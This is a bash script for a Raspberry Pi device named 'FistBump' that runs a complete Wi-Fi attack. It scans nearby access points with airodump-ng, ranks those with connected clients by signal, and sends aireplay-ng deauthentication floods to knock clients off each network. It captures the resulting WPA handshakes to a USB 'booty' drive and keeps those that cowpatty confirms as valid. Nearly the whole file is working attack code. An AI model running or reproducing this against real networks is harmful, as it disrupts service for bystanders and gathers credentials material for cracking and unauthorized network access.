#!/bin/bash
# VARIABLES
# ------------------------------------ ------------------------------------------------------------ check for removable storage 
bootydir="/media/usb0"
python /home/pi/FistBump/clearblinkt.py

if [ -e "/dev/sda" ]; then
        echo "flash drive attached"
	#number of handshakes existing
	declare -i prevCap=$(ls /media/usb0 | wc -l)
	echo $prevCap
else 
        echo "Error: Booty drive not present"
        echo "Please insert a usb thumb dirve"
	# show red for 2 second TODO
    	python /home/pi/FistBump/rgb.py 255 0 0 &
	sleep 3
	python /home/pi/FistBump/rgb.py 0 0 0 &
	python /home/pi/FistBump/arm_trigger.py
	exit
fi

# ---------------------------------------------------------------------------------------------------- start monitor mode 
python /home/pi/FistBump/purple_scan.py &
INDI=$!

# Network Scan Time in seconds
scanTime=20

# start monitor mode
sudo airmon-ng start wlan0

sleep 2
# stop monitor setup indicators
#sudo pkill -f -SIGINT /home/pi/FistBump/random_purple.py &
kill $INDI

# ---------------------------------------------------------------------------------------------------- start ap scan
python /home/pi/FistBump/random_purple.py &
INDI=$!

echo "------------------Starting Scan"

	{ timeout -k 15 15 airodump-ng -a -w my --output-format csv mon0;} &
PID=$!

# wait 15 seconds
sleep 15

#kill scan
kill -TERM $PID
#sudo pkill -f -SIGINT /home/pi/FistBump/purple_scan.py &
kill $INDI
# ---------------------------------------------------------------------------------------------------- begin parsing results
python /home/pi/FistBump/random_yellow.py &
INDI=$!

# 1=bssid  9=power 4=channel 11=data 14=essid 
cat my-01.csv | awk -F "," '{print $1, $9, $4, $11, $14}' > $bootydir/networks.csv && rm my-01.csv

echo "------------------Parsing AP results with clients"

# create empty file to append
echo -n > $bootydir/parsed_results.csv

#loop through columns
# bssid, power, channel, data, essid
while read f1 f2 f3 f4 f5
do
        if [ $f4 -gt 0 2>/dev/null ]
	then
		echo  "$f1 $f2 $f3 $f5" >> $bootydir/parsed_results.csv
	fi
done < $bootydir/networks.csv

#clean up  csv file
rm $bootydir/networks.csv

sort -k2 -n -r -o $bootydir/sorted.csv $bootydir/parsed_results.csv  && rm $bootydir/parsed_results.csv

echo ""
echo "---RESULTS with clients sorted by power---"
cat $bootydir/sorted.csv

#sudo pkill -f -SIGINT /home/pi/FistBump/random_yellow.py &
kill $INDI

# ---------------------------------------------------------------------------------------------------- start attack
python /home/pi/FistBump/random_colors.py &
INDI=$!

# 1=bssid 3=channel 4=essid 
while read f1 f2 f3 f4
do

	echo "---------------------------------------------------"
	echo "$f1 $f2 $f3 $f4"
	echo "---------------------------------------------------"
		{ timeout -k 20 20 airodump-ng -a -w "$bootydir"/"$f4" --bssid "$f1" --channel "$f3" --output-format cap mon0;} &
	PID=$!

	#deauth
	aireplay-ng --deauth 10 -a "$f1" --ignore-negative-one mon0 

 	sleep 20
	#kill scan
	kill -TERM $PID
done < $bootydir/sorted.csv

#sudo pkill -f -SIGINT /home/pi/FistBump/random_colors.py &
kill $INDI

# --------------------------------------------------------------------------------------------------- check results
python /home/pi/FistBump/yellow_scan.py &
INDI=$!

#clean up
#stop monitor mode
airmon-ng stop mon0 
rm $bootydir/sorted.csv

#check for valid handshakes
captured=0
for file in $bootydir/*.cap; do
        echo "------------------------------------"
        echo "Checking file: $file"
        if cowpatty -c -r $file | grep 'Collected'; then
                echo "++++++ Valid Handshake Collected"
                captured=$(expr $captured + 1)
        else
                echo "No Valid Handshake Collected deleting"
                rm $file
        fi
done
a="Captured "
b=" handshakes"
c=$a$captured$b
echo $c

#sudo pkill -f -SIGINT /home/pi/FistBump/yellow_scan.py &
kill $INDI

#did we get a new handshake?
if [ $captured -gt $prevCap ]; then
	python /home/pi/FistBump/rgb.py 255 0 255 &
else
	python /home/pi/FistBump/rgb.py 255 150 0 &
fi

sleep 3

python /home/pi/FistBump/rgb.py 0 0 0
python /home/pi/FistBump/clearblinkt.py 
python /home/pi/FistBump/arm_trigger.py
exit
